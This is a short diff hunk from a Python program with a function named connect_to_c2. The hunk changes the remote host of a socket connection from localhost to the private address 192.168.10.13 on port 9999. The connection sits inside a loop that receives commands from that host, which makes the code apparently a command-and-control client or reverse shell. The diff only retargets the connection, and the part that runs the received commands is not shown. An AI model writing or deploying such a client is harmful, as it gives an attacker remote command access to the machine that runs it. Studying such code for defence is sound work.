@@ -13,7 +13,7 @@ def connect_to_c2():
     while True:
         try:
             client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-            client.connect(("127.0.0.1", 9999))
+            client.connect(("192.168.10.13", 9999))
             while True:
                 command= client.recv(1024).decode()
                 if not command:
